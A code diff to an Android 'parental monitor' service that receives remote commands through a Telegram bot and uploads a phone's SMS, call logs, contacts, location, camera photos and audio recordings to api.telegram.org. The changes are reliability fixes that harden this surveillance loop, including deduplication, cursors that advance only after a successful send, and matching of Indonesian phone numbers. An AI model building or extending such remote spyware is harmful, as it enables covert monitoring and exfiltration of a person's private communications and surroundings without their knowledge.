@@ -104,7 +104,7 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
-        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version")
+        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
@@ -665,16 +665,22 @@ class MonitoringService : Service() {
         val updates = response.body()?.result ?: return false
         if (updates.isEmpty()) return false
         for (update in updates) {
-            val seen = !handledUpdateIds.add(update.updateId)
-            if (handledUpdateIds.size > 300) {
-                try {
-                    val it = handledUpdateIds.iterator()
-                    if (it.hasNext()) {
-                        it.next()
-                        it.remove()
+            val seen = synchronized(handledUpdateIds) {
+                val s = !handledUpdateIds.add(update.updateId)
+                while (handledUpdateIds.size > 300) {
+                    try {
+                        val it = handledUpdateIds.iterator()
+                        if (it.hasNext()) {
+                            it.next()
+                            it.remove()
+                        } else {
+                            break
+                        }
+                    } catch (_: Exception) {
+                        break
                     }
-                } catch (_: Exception) {
                 }
+                s
             }
             if (seen) continue
             try {
@@ -1377,6 +1383,16 @@ class MonitoringService : Service() {
                 }
             }
             "/help", "/start" -> {
+                if (!senderOk) {
+                    sendToTelegram(
+                        buildString {
+                            appendLine("🤖 <b>Commands</b>")
+                            appendLine("/ping - check delay")
+                            appendLine("/help - show this list")
+                        }
+                    )
+                    return
+                }
                 sendToTelegram(
                     buildString {
                         appendLine("👆 <b>Tap a button below</b>")
@@ -1599,11 +1615,12 @@ class MonitoringService : Service() {
                         }
                     }
                     val sentSmsPart = sendFitted(message)
-                    try {
-                        preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
-                    } catch (_: Exception) {
-                    }
-                    if (!sentSmsPart) {
+                    if (sentSmsPart) {
+                        try {
+                            preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
+                        } catch (_: Exception) {
+                        }
+                    } else {
                         initialOk = false
                     }
                     delay(500)
@@ -1633,17 +1650,18 @@ class MonitoringService : Service() {
                         }
                     }
                     val sentCallPart = sendFitted(message)
-                    try {
-                        val latest = part.maxWith(compareBy({ it.date }, { it.id }))
-                        if (latest.date > preferencesManager.lastCallTimestamp ||
-                            (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
-                        ) {
-                            preferencesManager.lastCallTimestamp = latest.date
-                            preferencesManager.lastCallId = latest.id
+                    if (sentCallPart) {
+                        try {
+                            val latest = part.maxWith(compareBy({ it.date }, { it.id }))
+                            if (latest.date > preferencesManager.lastCallTimestamp ||
+                                (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                            ) {
+                                preferencesManager.lastCallTimestamp = latest.date
+                                preferencesManager.lastCallId = latest.id
+                            }
+                        } catch (_: Exception) {
                         }
-                    } catch (_: Exception) {
-                    }
-                    if (!sentCallPart) {
+                    } else {
                         initialOk = false
                     }
                     delay(500)
@@ -1733,11 +1751,25 @@ class MonitoringService : Service() {
 
     private fun numberMatches(raw: String, digits: String): Boolean {
         val normalized = raw.filter { it.isDigit() }
-        if (normalized.isEmpty() || digits.isEmpty()) return false
-        if (normalized == digits) return true
-        if (normalized.length < 7 || digits.length < 7) return false
-        return normalized.endsWith(digits) || digits.endsWith(normalized)
+        val want = digits.filter { it.isDigit() }
+        if (normalized.isEmpty() || want.isEmpty()) return false
+        if (normalized == want) return true
+        if (normalized.length < 7 || want.length < 7) return false
+        if (normalized.endsWith(want) || want.endsWith(normalized)) return true
+        for (a in idVariants(normalized)) {
+            for (b in idVariants(want)) {
+                if (a.endsWith(b) || b.endsWith(a)) return true
+            }
+        }
+        return false
     }
+
+    private fun idVariants(digits: String): List<String> {
+        if (digits.isEmpty()) return emptyList()
+        val alt = if (digits.startsWith("62") && digits.length > 10) "0" + digits.substring(2) else if (digits.startsWith("0") && digits.length > 1) "62" + digits.substring(1) else digits
+        return if (alt == digits) listOf(digits) else listOf(digits, alt)
+    }
+
 
     private fun isPremiumSmsNumber(raw: String): Boolean {
         val digits = raw.filter { it.isDigit() }
@@ -2584,6 +2616,10 @@ class MonitoringService : Service() {
             }
             val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
             ringtone = android.media.RingtoneManager.getRingtone(applicationContext, uri)
+            if (ringtone == null) {
+                sendToTelegram("⚠️ Ring failed (no alarm sound).")
+                return
+            }
             try {
                 ringtone?.streamType = stream
             } catch (_: Exception) {
@@ -2697,7 +2733,7 @@ class MonitoringService : Service() {
             val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
             val caption = ("\uD83C\uDF99\uFE0F " + TimeFmt.full(System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
             val url = "https://api.telegram.org/bot$botToken/sendAudio"
-            val response = TelegramClient.api.sendAudio(url, chatIdBody, caption, audioPart)
+            val response = TelegramMediaClient.api.sendAudio(url, chatIdBody, caption, audioPart)
             if (response.isSuccessful && response.body()?.ok == true) {
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
                 deleteQuietly(audioFile)
@@ -2885,7 +2921,7 @@ class MonitoringService : Service() {
 
             val url = "https://api.telegram.org/bot$botToken/sendPhoto"
 
-            val response = TelegramClient.api.sendPhoto(url, chatIdBody, caption, photoPart)
+            val response = TelegramMediaClient.api.sendPhoto(url, chatIdBody, caption, photoPart)
 
             if (response.isSuccessful && response.body()?.ok == true) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
